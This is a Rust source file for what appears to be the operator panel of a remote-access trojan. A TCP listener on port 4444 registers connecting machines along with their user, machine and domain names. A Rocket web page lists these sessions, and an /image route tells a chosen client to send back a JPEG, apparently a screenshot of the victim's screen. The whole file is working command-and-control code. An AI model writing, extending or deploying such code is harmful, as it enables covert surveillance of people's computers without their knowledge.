#[macro_use] extern crate rocket;
extern crate tera;

use std::collections::HashMap;
use std::fs::File;
use std::io::{Cursor, ErrorKind, Read, Write};
use std::net::{SocketAddr, TcpListener, TcpStream};
use std::sync::Arc;
use std::thread;
use dashmap::DashMap;
use lazy_static::lazy_static;
use rocket::http::{ContentType, Status};
use rocket::response::content::RawHtml;
use rocket::serde::Serialize;
use rocket::{Request, Response, State};
use rocket::response::Responder;
use rocket::tokio::io::split;
use tera::{Context, Tera};


lazy_static! {
    pub static ref TEMPLATES: Tera = {
        let mut tera = match Tera::new("templates/**/*") {
            Ok(t) => t,
            Err(e) => {
                println!("Parsing error(s): {}", e);
                ::std::process::exit(1);
            }
        };
        tera.autoescape_on(vec![".html"]);
        tera
    };
}

/*fn handle_client(mut stream: TcpStream) -> Result<(), std::io::Error> {

    let mut file = File::create("foo.jpg")?;
    file.write_all(buffer.as_slice())?;

    loop {

    }

    Ok(())
}*/

struct Image(Vec<u8>);


impl<'a> Responder<'a, 'a> for Image {
    fn respond_to(self, _: &Request) -> rocket::response::Result<'a> {
        Response::build()
            .header(ContentType::JPEG)
            .status(Status::Ok)
            .sized_body(self.0.len(), Cursor::new(self.0))
            .ok()
    }
}

#[get("/image/<id>")]
async fn get_image(id: u32, sessions: &State<Arc<DashMap<u32, Client>>>) -> Image {
    // Call your function to get the image data
    let mut stream = &sessions.get(&id).unwrap().stream;
    let message = &[2u8];
    let mut img_size: [u8; 8] = [0; 8];
    stream.write_all(message).expect("test");

    let _ = stream.read_exact(&mut img_size);
    let img_size: u64 =
        (img_size[7] as u64 ) << 8 * 7
            | (img_size[6] as u64) << 8 * 6
            | (img_size[5] as u64) << 8 * 5
            | (img_size[4] as u64) << 8 * 4
            | (img_size[3] as u64) << 8 * 3
            | (img_size[2] as u64) << 8 * 2
            | (img_size[1] as u64) << 8 * 1
            | (img_size[0] as u64) << 8 * 0;

    let mut buffer = vec![0u8; img_size as usize];
    stream.read_exact(&mut buffer).expect("test");
    Image(buffer)
}

#[get("/")]
async fn index(sessions: &State<Arc<DashMap<u32, Client>>>) -> RawHtml<String> {
    #[derive(Serialize)]
    struct DisplayClient {
        id: u32,
        ip: String,
        user: String,
        machine: String,
        domain: String
    };

    let data = sessions.iter()
        .map(|x| {
            DisplayClient {
                id: x.id,
                ip: x.stream.peer_addr().map(|x| x.to_string()).unwrap_or("Unknown".to_string()),
                user: x.user.clone(),
                machine: x.machine.clone(),
                domain: x.domain.clone(),
            }
        })
        .collect::<Vec<_>>();

    let mut ctx = Context::new();
    ctx.insert("sessions", &data);
    let html = TEMPLATES.render("index.html", &ctx).expect("test");
    RawHtml(html)
}

struct Client {
    id: u32,
    stream: TcpStream,
    user: String,
    machine: String,
    domain: String
}

#[launch]
fn rocket() -> _ {
    let address = SocketAddr::from(([127,0,0,1], 4444));
    let listener = TcpListener::bind(address).expect("Couldn't bind listener");

    let mut available_id = 0;
    let mut sessions: Arc<DashMap<u32, Client>> = Arc::new(DashMap::new());

    let cloned = sessions.clone();
    thread::spawn(move || {
        let mut available_id = 0;
        loop {
            let (mut stream, _) = listener.accept().expect("Couldn't establish connection");
            println!("New session: {:?}", (&stream));

            let message = [1u8]; // kInfo
            let mut size = [0u8; 4];
            if let Err(x) = stream.write_all(&message) {
                break;
            };

            if let Err(x) = stream.read_exact(&mut size) {
                break
            }

            let size: u64 =
                (size[3] as u64 ) << 8 * 3
                    | (size[2] as u64) << 8 * 2
                    | (size[1] as u64) << 8 * 1
                    | (size[0] as u64) << 8 * 0;

            let mut buffer = vec![0u8; size as usize];
            stream.read_exact(&mut buffer).expect("Test");

            let buffer = buffer
                .chunks_exact(2)
                .map(|a| {
                    u16::from_ne_bytes([a[0], a[1]])
                })
                .collect::<Vec<u16>>();
            let str = String::from_utf16(buffer.as_slice()).expect("test");

            let count = str.chars().filter(|x| *x == '.').count();
            let mut split = str.split_terminator('.');
            let (user, machine, domain) = match count {
                2 => {
                    let machine = split.next().unwrap_or("Unknown");
                    let domain = split.next().unwrap_or("Unknown");
                    let user = split.next().unwrap_or("Unknown");
                    (user, machine, domain)
                }
                1 => {
                    let machine = split.next().unwrap_or("Unknown");
                    let domain = "";
                    let user = split.next().unwrap_or("Unknown");
                    (user, machine, domain)
                }
                _ => return
            };

            sessions.insert(available_id, Client {
                id: available_id,
                stream,
                user: user.to_string(),
                machine: machine.to_string(),
                domain: domain.to_string(),
            });
            available_id += 1;
        }
    });

    rocket::build()
        .manage(cloned)
        .mount("/", routes![index, get_image])
}